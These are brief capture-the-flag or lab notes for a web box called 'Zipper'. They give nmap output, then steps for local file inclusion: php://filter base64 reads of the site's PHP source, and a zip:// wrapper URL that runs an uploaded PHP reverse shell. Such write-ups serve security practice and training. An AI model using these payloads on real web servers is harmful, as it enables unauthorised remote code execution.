
```
PORT      STATE SERVICE        VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port 80 Zipper possible LFI 
**Decode the base64**

1. clicked on home (top left) gave us a parameter 
2. php://filter/convert.base64-encode/resource=index -> used to identify that its appending the .php file extension to each upload 
3. php://filter/convert.base64-encode/resource=home -> tell us that theres a upload.php directory 
4. php://filter/convert.base64-encode/resource=upload -> tell us about the exact directory
5. upload the php-reverse-shell.php -> re download it to get the id of the file
6. TARGET/index.php?file=zip://uploads/upload_1711002348.zip%23php-reverse-shell-linux -> to trigger the reverse shell 
7. dont put .php at the end 
